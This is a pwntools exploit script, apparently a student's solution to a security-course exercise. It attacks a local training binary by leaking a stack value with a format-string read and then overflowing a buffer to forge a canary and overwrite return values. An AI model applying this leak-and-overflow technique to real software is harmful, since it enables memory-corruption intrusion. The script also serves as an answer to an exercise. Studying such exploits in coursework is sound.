#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise5/exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x40136c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

r.recvuntil(b'user 2:\n')
r.sendline(b'%7$p')
l = r.recvline()
n = l[2:l.index(b'is')]
param_6_lo = int(b'0x' + n[:-8], 0) # param5 = 4
param_6_hi = int(b'0x' + n[-8:], 0) # actual param6

r.recvuntil(b'user 2:\n')
# the buffer starts at $10 + (256/8 = 32) = $42 will be the first value after the array
r.send(b'A' * 256) # buffer filling
r.send(p32(param_6_hi) + p32(1)) # artificial canary
r.sendline(p32(0x98) + p32(0x98)) # override return value and return condition

r.recvline()
r.recvline()
print(r.recvline())
